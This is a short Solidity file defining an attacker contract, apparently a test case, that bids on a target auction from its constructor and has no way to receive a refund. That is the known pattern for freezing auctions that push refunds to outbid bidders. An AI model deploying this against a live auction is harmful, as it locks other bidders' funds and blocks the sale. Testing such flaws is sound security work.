//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.13;

 interface IAttackTestAuction {
    function bid() external payable;
 }

contract AttackTestAuction {

    IAttackTestAuction auctionAddress;

    constructor(address _auctionAddress) payable {
        auctionAddress = IAttackTestAuction(_auctionAddress);
        auctionAddress.bid{value: msg.value}();
    }

}